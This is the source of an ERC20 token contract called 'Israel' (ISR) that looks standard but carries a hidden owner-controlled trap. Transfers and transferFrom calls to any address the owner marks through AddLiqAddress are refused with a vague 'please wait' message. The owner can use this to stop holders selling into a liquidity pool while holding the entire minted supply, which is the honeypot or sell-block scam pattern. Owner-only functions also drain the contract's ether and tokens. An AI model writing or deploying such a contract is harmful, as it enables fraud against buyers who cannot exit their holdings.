// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Ownable.sol";
import "./Context.sol";
import "./IERC20.sol";
import "./SafeMath.sol";

contract IsraelToken is Context, IERC20, Ownable {
    using SafeMath for uint256;

    event WithdrawtoOwnerEvent(address indexed Owneraddress, uint256 amount);

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _liqAddress;

    string private _name = "Israel";
    string private _symbol = "ISR";
    uint8 private _decimals = 18;
    uint256 private _totalSupply = 200000000 * 10 ** 18;

    constructor() {
        _balances[msg.sender] = _balances[msg.sender].add(_totalSupply);
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function getOwner() external view override returns (address) {
        return owner();
    }

    function name() public view override returns (string memory) {
        return _name;
    }

    function symbol() public view override returns (string memory) {
        return _symbol;
    }

    function decimals() public view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        require(!_liqAddress[recipient], "You can't do it now, please wait");
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        require(!_liqAddress[recipient], "You can't do it now, please wait");
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(
            amount,
            "ERC20: transfer amount exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function WithdrawToOwner() public onlyOwner {
        _WithdrawToOwner();
    }

    function _WithdrawToOwner() private {
        payable(owner()).transfer(address(this).balance);
        emit WithdrawtoOwnerEvent(_msgSender(), address(this).balance);
    }

    function WithdrawERC20(IERC20 token) public onlyOwner returns (bool) {
        require(
            token.transfer(msg.sender, token.balanceOf(address(this))),
            "Transfer failed"
        );
        return true;
    }

    function AddLiqAddress(address _addr) external onlyOwner returns (bool) {
        require(!_liqAddress[_addr], "this liq is exist");
        _liqAddress[_addr] = true;
        return true;
    }

    function RemoveLiqAddress(address _addr) external onlyOwner returns (bool) {
        require(_liqAddress[_addr], "this liq is not exist");
        _liqAddress[_addr] = false;
        return false;
    }
}
